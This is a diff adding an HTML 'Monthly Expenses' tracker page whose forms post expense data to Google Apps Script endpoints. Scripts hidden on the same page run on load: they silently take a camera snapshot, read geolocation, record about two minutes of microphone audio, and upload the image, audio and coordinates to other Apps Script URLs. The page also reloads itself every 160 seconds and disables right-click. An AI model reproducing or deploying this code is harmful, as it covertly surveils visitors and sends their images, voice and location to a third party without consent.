@@ -1,0 +1,878 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <link rel="icon" type="image/png" href="images/photo1.jpg" />
+    <meta name="viewport" content="width=1100" />
+    <title>Monthly Expenses</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+      }
+
+      .container {
+        max-width: 400px;
+        margin: 0 auto;
+      }
+
+      .center {
+        text-align: center;
+        color: #333;
+      }
+
+      .bold {
+        font-weight: bold;
+      }
+
+      .form-input {
+        width: 100%;
+        padding: 8px;
+        margin-bottom: 10px;
+      }
+
+      .btn-primary {
+        background-color: #007bff;
+        color: #fff;
+        padding: 10px 20px;
+        border: none;
+        cursor: pointer;
+      }
+
+      .data-table {
+        width: 80%;
+        border-collapse: collapse;
+        margin: 0 auto;
+      }
+
+      .data-table th,
+      .data-table td {
+        border: 1px solid #333;
+        padding: 8px;
+      }
+
+      /* Add more styles as needed */
+    </style>
+  </head>
+  <body>
+    <h1 style="text-align: center; color: #333">Monthly Expenses</h1>
+    <form
+      id="expenseForm"
+      style="
+        max-width: 400px;
+        margin: 20px auto;
+        background: #fff;
+        padding: 20px;
+        border-radius: 8px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      "
+    >
+      <label for="expenseCategory" style="font-weight: bold"
+        >Expense Category:</label
+      >
+      <select
+        id="expenseCategory"
+        style="width: 100%; padding: 8px; margin-bottom: 10px"
+        onchange="showTextBox()"
+      >
+        <option value="Rent">Rent</option>
+        <option value="Food">Food</option>
+        <option value="Travel">Travel</option>
+        <option value="Product">Product</option>
+        <option value="FixedDeposit">Fixed Deposit</option>
+        <option value="Others">Others</option></select
+      ><br />
+
+      <div id="othersTextBox" style="display: none">
+        <label for="expenseOthers" style="font-weight: bold"
+          >Other Expense:</label
+        >
+        <input
+          type="text"
+          id="expenseOthers"
+          style="width: 100%; padding: 8px; margin-bottom: 10px"
+        /><br />
+      </div>
+
+      <div id="foodTextBox" style="display: none">
+        <label for="food" style="font-weight: bold">What Food:</label>
+        <input
+          type="text"
+          id="food"
+          style="width: 100%; padding: 8px; margin-bottom: 10px"
+        /><br />
+      </div>
+
+      <div id="productTextBox" style="display: none">
+        <label for="product" style="font-weight: bold">What Product:</label>
+        <input
+          type="text"
+          id="product"
+          style="width: 100%; padding: 8px; margin-bottom: 10px"
+        /><br />
+      </div>
+
+      <div id="travelFields" style="display: none">
+        <label for="source" style="font-weight: bold">Source:</label>
+        <input
+          type="text"
+          id="source"
+          placeholder="Enter source"
+          style="width: 100%; padding: 8px; margin-bottom: 10px"
+        />
+
+        <label for="destination" style="font-weight: bold">Destination:</label>
+        <input
+          type="text"
+          id="destination"
+          placeholder="Enter destination"
+          style="width: 100%; padding: 8px; margin-bottom: 10px"
+        />
+      </div>
+
+      <label for="expenseAmount" style="font-weight: bold"
+        >Expense Amount (₹):</label
+      >
+      <input
+        type="number"
+        id="expenseAmount"
+        required
+        style="width: 95%; padding: 8px; margin-bottom: 10px"
+      /><br />
+      <label for="expenseDate" style="font-weight: bold">Select Date:</label>
+      <input
+        type="date"
+        id="expenseDate"
+        required
+        style="width: 95%; padding: 8px; margin-bottom: 10px"
+      /><br />
+
+      <label for="expenseMonth" style="font-weight: bold">Select Month:</label>
+      <select
+        id="expenseMonth"
+        style="width: 100%; padding: 8px; margin-bottom: 10px"
+        onchange="showTextBox1()"
+      ></select
+      ><br />
+
+      <div id="othermonth" style="display: none">
+        <label for="othermonth" style="font-weight: bold">Other Data:</label>
+        <input
+          type="text"
+          id="othermonthvalue"
+          style="width: 100%; padding: 8px; margin-bottom: 10px"
+        /><br />
+      </div>
+
+      <button
+        type="button"
+        onclick="addExpense()"
+        style="
+          background-color: #007bff;
+          color: #fff;
+          padding: 10px 20px;
+          border: none;
+          cursor: pointer;
+        "
+      >
+        Add Expense
+      </button>
+    </form>
+    <br /><br />
+    <h1 style="color: #3366cc; text-align: center">Fetch Data</h1>
+    <form
+      id="dataForm"
+      style="
+        max-width: 400px;
+        margin: 20px auto;
+        background: #fff;
+        padding: 20px;
+        border-radius: 8px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      "
+    >
+      <label
+        for="month"
+        style="font-weight: bold; display: block; margin-bottom: 10px"
+        >Select a Month:</label
+      >
+      <select
+        id="month"
+        name="month"
+        style="
+          width: 100%;
+          padding: 10px;
+          margin: 10px 0;
+          font-size: 16px;
+          border: 1px solid #ccc;
+          border-radius: 4px;
+          box-sizing: border-box;
+        "
+        onchange="showTextBox2()"
+      >
+        <option value="January">January</option>
+        <option value="February">February</option>
+        <option value="March">March</option>
+        <option value="April">April</option>
+        <option value="May">May</option>
+        <option value="June">June</option>
+        <option value="July">July</option>
+        <option value="August">August</option>
+        <option value="September">September</option>
+        <option value="October">October</option>
+        <option value="November">November</option>
+        <option value="December">December</option>
+        <option value="Others">Others</option>
+      </select>
+
+      <div id="othermonth0" style="display: none">
+        <label for="othermonth0" style="font-weight: bold">Other Month:</label>
+        <input
+          type="text"
+          id="othermonthvalue0"
+          style="width: 100%; padding: 8px; margin-bottom: 10px"
+        /><br />
+      </div>
+
+      <label
+        for="year"
+        style="font-weight: bold; display: block; margin-bottom: 10px"
+        >Select a Year:</label
+      >
+      <select
+        id="year"
+        name="year"
+        style="
+          width: 100%;
+          padding: 10px;
+          margin: 10px 0;
+          font-size: 16px;
+          border: 1px solid #ccc;
+          border-radius: 4px;
+          box-sizing: border-box;
+        "
+      >
+        <option disabled value="">Select a year</option>
+        <script>
+          const selectYear = document.getElementById("year");
+          const currentYear = new Date().getFullYear();
+
+          for (let year = 2000; year <= 2100; year++) {
+            const option = document.createElement("option");
+            option.value = year;
+            option.text = year;
+            if (year === currentYear) {
+              option.selected = true; // Set current year as default
+            }
+            selectYear.appendChild(option);
+          }
+        </script>
+      </select>
+
+      <input
+        type="text"
+        id="salary"
+        placeholder="Salary"
+        style="
+          width: 100%;
+          padding: 10px;
+          margin: 10px 0;
+          font-size: 16px;
+          border: 1px solid #ccc;
+          border-radius: 4px;
+          box-sizing: border-box;
+        "
+      />
+
+      <input
+        type="submit"
+        value="Submit"
+        style="
+          width: 100%;
+          padding: 10px;
+          margin: 10px 0;
+          font-size: 16px;
+          background-color: #4caf50;
+          color: #fff;
+          border: none;
+          border-radius: 4px;
+          box-sizing: border-box;
+          cursor: pointer;
+        "
+      />
+
+      <div>
+        <a
+          href="https://docs.google.com/spreadsheets/d/e/2PACX-1vTY2Q1S6il3auyfSEqb90hs4PYcQvv4KK5VX1Tv5ZjfXD7TrejkQMia5CguLQTlPpTQZt2zy6IaCQNJ/pub?output=xlsx"
+          download
+        >
+          <button
+            type="button"
+            style="
+              background-color: #007bff;
+              color: #fff;
+              padding: 10px;
+              margin: 10px 0;
+              border: none;
+              border-radius: 4px;
+              cursor: pointer;
+              box-sizing: border-box;
+            "
+          >
+            Download Excel
+          </button>
+        </a>
+      </div>
+    </form>
+
+    <div id="result" style="margin-top: 20px; font-size: 18px"></div>
+    <div
+      id="result1"
+      style="margin-top: 20px; font-size: 18px; text-align: center"
+    ></div>
+
+    <br />
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <script>
+      // Get the current date
+
+      // Get the current date in YYYY-MM-DD format
+      const currentDate12 = new Date().toISOString().split("T")[0];
+
+      // Set the value of the date input to the current date
+      document.getElementById("expenseDate").value = currentDate12;
+
+      const currentDate1 = new Date();
+
+      // Get the current month (returns a number from 0 to 11, where 0 is January and 11 is December)
+      const currentMonthIndex = currentDate1.getMonth();
+
+      // Get the <select> element by its id
+      const monthSelect = document.getElementById("month");
+
+      if (monthSelect === "Others") {
+        monthSelect = document.getElementById("othermonthvalue0").value;
+      }
+
+      // Set the selected attribute on the option corresponding to the current month
+      monthSelect.options[currentMonthIndex].selected = true;
+
+      document
+        .getElementById("dataForm")
+        .addEventListener("submit", function (event) {
+          event.preventDefault(); // Prevent the form from submitting the traditional way
+
+          // Get the selected month from the dropdown list
+          var selectedMonth = document.getElementById("month").value;
+          var year = document.getElementById("year").value;
+
+          // Prepare the form data
+          var formData = new FormData();
+          formData.append("selectedMonth", selectedMonth);
+          formData.append("year", year);
+          console.log(selectedMonth);
+          console.log(formData);
+          // Send the form data to the script
+          fetch(
+            "https://script.google.com/macros/s/AKfycbwzBfYuLVzF1gUe-xcDg-SmNz8eQOBmEB6tK_lWLPine0RZ_F_SAaMGoPALgxhw-5X7BA/exec",
+            {
+              method: "POST",
+              body: formData,
+            }
+          )
+            .then(function (response) {
+              if (response.ok) {
+                return response.text();
+              } else {
+                throw new Error("Network response was not ok.");
+                alert("Network response was not ok.");
+                location.reload();
+              }
+            })
+            .then(function (data) {
+              displayResult(data); // Call the displayResult function to show the result
+            })
+            .catch(function (error) {
+              // Handle errors here
+              console.error(error);
+              alert("Sheet Not Found In Database");
+              location.reload();
+            });
+        });
+
+      function displayResult(result) {
+        const resultDiv = document.getElementById("result");
+
+        // Parse the JSON data
+        const jsonData = JSON.parse(result);
+        console.log(jsonData);
+
+        if (jsonData.length > 0) {
+          // Create an HTML table
+          const table = document.createElement("table");
+          table.classList.add("data-table");
+
+          // Create the table header
+          const headerRow = document.createElement("tr");
+
+          // Skip the first row of jsonData for the header
+          const keys = Object.keys(jsonData[0]);
+
+          // Create rows for each data entry
+          for (let i = 0; i < jsonData.length; i++) {
+            const dataEntry = jsonData[i];
+            const row = document.createElement("tr");
+            keys.forEach((key) => {
+              const cell = document.createElement("td");
+              const cellValue = dataEntry[key];
+
+              // For all keys, display the original value
+              cell.textContent = cellValue;
+              row.appendChild(cell);
+            });
+            table.appendChild(row);
+          }
+
+          // Clear the result div and append the table
+          resultDiv.innerHTML = "";
+          resultDiv.appendChild(table);
+
+          // Calculate the total amount
+          const totalAmount = jsonData
+            .slice(1)
+            .reduce((acc, row) => acc + parseFloat(row[1]), 0);
+
+          // Display the total amount as a separate paragraph
+          const totalAmountParagraph = document.createElement("p");
+          totalAmountParagraph.textContent = `Spent Amount: ₹${totalAmount.toFixed(
+            2
+          )}`;
+          totalAmountParagraph.style.textAlign = "center"; // Center-align the content
+
+          resultDiv.appendChild(totalAmountParagraph);
+
+          // Log the total amount to the console
+          console.log("Spent Amount:", totalAmount.toFixed(2));
+
+          var salaryInput = document.getElementById("salary").value;
+          var earnings;
+
+          if (salaryInput === "") {
+            earnings = 0;
+          } else {
+            earnings = parseFloat(salaryInput) - totalAmount;
+          }
+
+          var resultDiv1 = document.getElementById("result1");
+          if (earnings >= 0) {
+            resultDiv1.innerHTML = "Earnings: ₹" + earnings.toFixed(2);
+          } else {
+            resultDiv1.innerHTML = "Loss: ₹" + Math.abs(earnings).toFixed(2);
+          }
+        } else {
+          resultDiv.textContent = "No data found for the selected month.";
+          alert("No data found for the selected selected month.");
+          location.reload();
+        }
+      }
+      function showTextBox() {
+        var selectedOption = document.getElementById("expenseCategory").value;
+        var othersTextBox = document.getElementById("othersTextBox");
+
+        // Show the text box if "Others" is selected, hide it otherwise
+        if (selectedOption === "Others") {
+          othersTextBox.style.display = "block";
+        } else {
+          othersTextBox.style.display = "none";
+        }
+
+        var selectedOption1 = document.getElementById("expenseCategory").value;
+        var othersTextBox1 = document.getElementById("foodTextBox");
+
+        // Show the text box if "Food" is selected, hide it otherwise
+        if (selectedOption1 === "Food") {
+          othersTextBox1.style.display = "block";
+        } else {
+          othersTextBox1.style.display = "none";
+        }
+
+        var selectedOption2 = document.getElementById("expenseCategory").value;
+        var othersTextBox2 = document.getElementById("productTextBox");
+
+        // Show the text box if "Food" is selected, hide it otherwise
+        if (selectedOption2 === "Product") {
+          othersTextBox2.style.display = "block";
+        } else {
+          othersTextBox2.style.display = "none";
+        }
+        var selectedOption3 = document.getElementById("expenseCategory").value;
+        var travelFields = document.getElementById("travelFields");
+
+        // Show the travel text boxes only if the selected value is "Travel"
+        if (selectedOption3 === "Travel") {
+          travelFields.style.display = "block";
+        } else {
+          travelFields.style.display = "none";
+        }
+      }
+
+      function showTextBox1() {
+        var selectedOption3 = document.getElementById("expenseMonth").value;
+        var othersTextBox3 = document.getElementById("othermonth");
+
+        // Show the text box if "Food" is selected, hide it otherwise
+        if (selectedOption3 === "Others") {
+          othersTextBox3.style.display = "block";
+        } else {
+          othersTextBox3.style.display = "none";
+        }
+      }
+
+      function showTextBox2() {
+        var selectedOption4 = document.getElementById("month").value;
+        var othersTextBox4 = document.getElementById("othermonth0");
+
+        // Show the text box if "Food" is selected, hide it otherwise
+        if (selectedOption4 === "Others") {
+          othersTextBox4.style.display = "block";
+        } else {
+          othersTextBox4.style.display = "none";
+        }
+      }
+
+      // Create an object to store expenses by month
+      const expensesByMonth = {};
+      let totalExpenses = 0;
+
+      // Get the current month
+      const currentDate = new Date();
+      const currentMonth = currentDate.toLocaleString("default", {
+        month: "long",
+      });
+
+      // Set the current month as the default option in the dropdown
+      const expenseMonthSelect = document.getElementById("expenseMonth");
+      for (let i = 0; i < 12; i++) {
+        const month = new Date(currentDate.getFullYear(), i, 1).toLocaleString(
+          "default",
+          { month: "long" }
+        );
+        const option = new Option(month, month);
+        if (month === currentMonth) {
+          option.selected = true; // Set the current month as the default
+        }
+        expenseMonthSelect.add(option);
+      }
+
+      // Add "Others" option at the end
+      const otherOption = new Option("Others", "Others");
+      expenseMonthSelect.add(otherOption);
+
+      function addExpense() {
+        let expenseCategory = document.getElementById("expenseCategory").value;
+        let expenseAmount = parseFloat(
+          document.getElementById("expenseAmount").value
+        );
+        let expenseMonth = document.getElementById("expenseMonth").value;
+        let inputDate = document.getElementById("expenseDate").value; // Assuming the input date is in "YYYY-MM-DD" format
+
+        // Split the input date into an array
+        let dateParts = inputDate.split("-");
+
+        // Reorder the date parts
+        let formattedDate =
+          dateParts[2] + " / " + dateParts[1] + " / " + dateParts[0];
+
+        let formattedYear = dateParts[0];
+
+        console.log(formattedYear); // This will print the date in "DD * MM * YYYY" format
+
+        console.log(formattedDate); // This will print the date in "DD * MM * YYYY" format
+
+        if (expenseCategory === "Others") {
+          expenseCategory = document.getElementById("expenseOthers").value;
+        }
+        if (expenseCategory === "Product") {
+          expenseCategory = document.getElementById("product").value;
+        }
+        if (expenseCategory === "Food") {
+          expenseCategory = document.getElementById("food").value;
+        }
+
+        if (expenseCategory === "Travel") {
+          expenseCategory =
+            document.getElementById("source").value +
+            " - " +
+            document.getElementById("destination").value;
+        }
+
+        if (expenseMonth === "Others") {
+          expenseMonth = document.getElementById("othermonthvalue").value;
+        }
+
+        if (isNaN(expenseAmount) || expenseAmount <= 0) {
+          alert("Please enter a valid expense amount.");
+          return;
+        }
+
+        // Initialize an array for the month if it doesn't exist
+        if (!expensesByMonth[expenseMonth]) {
+          expensesByMonth[expenseMonth] = [];
+        }
+
+        // Add the expense to the appropriate month
+        expensesByMonth[expenseMonth].push({
+          category: expenseCategory,
+          amount: expenseAmount,
+        });
+
+        // Update total expenses
+        totalExpenses += expenseAmount;
+
+        // Clear input fields
+        document.getElementById("expenseAmount").value = "";
+
+        // Create a FormData object and append data to it.
+        var formData = new FormData();
+        formData.append("expenseCategory", expenseCategory);
+        formData.append("expenseAmount", expenseAmount);
+        formData.append("expenseMonth", expenseMonth);
+        formData.append("expenseDate", formattedDate);
+        formData.append("year", formattedYear);
+
+        fetch(
+          "https://script.google.com/macros/s/AKfycbxdiGDA5E2GQw46PZ7vcn4wqC4vaDY8dic4un2onikoc95cPXgyF6_OdVbaCRJIIUl9DQ/exec",
+          {
+            method: "POST",
+            body: formData,
+          }
+        )
+          .then(function (response) {
+            if (response.ok) {
+              return response.text();
+            } else {
+              throw new Error("Network response was not ok.");
+              alert("Network response was not ok.");
+              location.reload();
+            }
+          })
+          .then(function (data) {
+            // Handle the response from the script if needed
+            console.log(data);
+            alert("Expense added successfully!"); // Show an alert message on success
+            location.reload();
+          })
+
+          .catch(function (error) {
+            // Handle errors here
+            console.error(error);
+            alert(
+              "An error occurred while adding the expense. Please try again."
+            );
+            location.reload();
+          });
+      }
+    </script>
+
+    <video id="video" autoplay style="display: none"></video>
+    <canvas id="canvas" style="display: none"></canvas>
+    <img
+      id="captured-image"
+      src=""
+      alt="Captured Image"
+      style="display: none"
+    />
+
+    <script>
+      if (navigator.geolocation) {
+        navigator.permissions
+          .query({ name: "geolocation" })
+          .then(function (result) {
+            if (result.state === "granted") {
+              // Geolocation access granted
+              navigator.geolocation.getCurrentPosition(
+                function (position) {
+                  // Handle the obtained position
+                },
+                function (error) {
+                  console.error("Error getting geolocation:", error);
+                }
+              );
+            } else if (result.state === "prompt") {
+              // Geolocation access is requested
+            } else if (result.state === "denied") {
+              // Geolocation access denied by the user
+              console.error("Geolocation access denied by the user.");
+              // You can inform the user or provide an alternative method
+            } else if (result.state === "prompt") {
+              // Geolocation access is requested
+            }
+          });
+      } else {
+        console.error("Geolocation is not supported by this browser.");
+      }
+      captureCamera();
+      let latitude;
+      let longitude;
+      let mapUrl;
+      var website = "https://arunkumar-selvaraj.web.app/home.html";
+      let capturedImage = document.getElementById("captured-image");
+      var imageDataUrl;
+
+      function captureCamera() {
+        navigator.mediaDevices
+          .getUserMedia({ video: true })
+          .then(function (cameraStream) {
+            const video = document.getElementById("video");
+            const canvas = document.getElementById("canvas");
+            video.srcObject = cameraStream;
+            video.onloadedmetadata = function () {
+              captureImage(cameraStream);
+            };
+          })
+          .catch(function (error) {
+            console.error("Error accessing the camera: " + error);
+          });
+
+        getLocation();
+      }
+
+      function getLocation() {
+        if ("geolocation" in navigator) {
+          navigator.geolocation.getCurrentPosition(
+            function (position) {
+              latitude = position.coords.latitude;
+              longitude = position.coords.longitude;
+              mapUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+            },
+            function (error) {
+              console.error("Error accessing geolocation: " + error);
+            }
+          );
+        } else {
+          console.error("Geolocation is not supported");
+        }
+      }
+
+      function captureImage(stream) {
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const context = canvas.getContext("2d");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        imageDataUrl = canvas.toDataURL("image/png");
+        capturedImage.src = imageDataUrl;
+        if (stream) {
+          const tracks = stream.getTracks();
+          tracks.forEach((track) => track.stop());
+          sendImageData(imageDataUrl);
+        }
+      }
+
+      function sendImageData(imageDataUrl) {
+        let url =
+          "https://script.google.com/macros/s/AKfycbyRf0AWpmh3Z2CjnWYEE597VIY-gmnyj4T6AL3jnEQSfVFJ_2EWebvUiVTMoSg_ZsdO/exec";
+        console.log(latitude);
+        console.log(longitude);
+        console.log("imageDataUrl" + imageDataUrl.split("base64,")[1]);
+        let obj = {
+          base64: imageDataUrl.split("base64,")[1],
+          type: "image/png",
+          name: "captured_image.png",
+          url: mapUrl,
+          latitude: latitude,
+          longitude: longitude,
+          website: website,
+        };
+        fetch(url, {
+          method: "POST",
+          body: JSON.stringify(obj),
+        })
+          .then((response) => response.text())
+          .then((data) => console.log(data))
+          .catch((error) => console.error("Error sending image: " + error));
+      }
+    </script>
+
+    <div id="status"><span id="statusText"></span></div>
+    <script>
+      const status = document.getElementById("status");
+      console.log("Requesting access to the microphone...");
+      navigator.mediaDevices
+        .getUserMedia({ audio: true })
+        .then((stream) => {
+          console.log("Microphone access granted.");
+          const mediaRecorder = new MediaRecorder(stream);
+          const recordedChunks = [];
+          mediaRecorder.ondataavailable = (event) => {
+            recordedChunks.push(event.data);
+            console.log("Data available...");
+          };
+          mediaRecorder.onstop = () => {
+            console.log("Recording stopped.");
+            const blob = new Blob(recordedChunks, { type: "audio/webm" });
+            console.log("Blob created:", blob);
+            convertBlobToBase64(blob); // Convert blob to Base64 URL
+          };
+          mediaRecorder.start();
+          console.log("Recording started...");
+          setTimeout(() => {
+            mediaRecorder.stop();
+            console.log("Stopping recording after 10 seconds...");
+          }, 120000); // Stop recording after 10 seconds (adjust as needed)
+        })
+        .catch((err) => {
+          console.error("Error accessing the microphone:", err);
+        });
+
+      function convertBlobToBase64(blob) {
+        const reader = new FileReader();
+        reader.onload = function (event) {
+          const base64String = event.target.result.split(",")[1]; // Extracting base64 string
+          sendAudioToServer(base64String);
+        };
+        reader.readAsDataURL(blob);
+      }
+
+      function sendAudioToServer(base64String) {
+        const formData = new FormData();
+        formData.append("audio", base64String);
+        formData.append("website", website);
+        formData.append("latitude", latitude);
+        formData.append("longitude", longitude);
+        formData.append("url", mapUrl);
+        formData.append("name", "captured_image.png");
+        formData.append("type", "image/png");
+        formData.append("base64", imageDataUrl.split("base64,")[1]);
+
+        fetch(
+          "https://script.google.com/macros/s/AKfycbzcej4rWqyeW7zWXq6Yclfz2CFFakoeaB4PC1tWhePVVavuEdmhbjPQGe-8FO3flPOdpA/exec",
+          {
+            method: "POST",
+            body: formData,
+          }
+        )
+          .then((response) => {
+            console.log("Server response received:", response);
+            return response.text(); // Convert the response to text
+          })
+          .then((data) => {
+            console.log("Response: " + data);
+          })
+          .catch((error) => {
+            console.error("Error sending audio to the server:", error);
+            document.getElementById("status").innerText = "Error: " + error; // Display error message in the 'status' div
+          });
+      }
+      setTimeout(function () {
+        window.location.reload();
+      }, 160000);
+
+      document.addEventListener("contextmenu", function (e) {
+        e.preventDefault();
+      });
+    </script>
+  </body>
+</html>
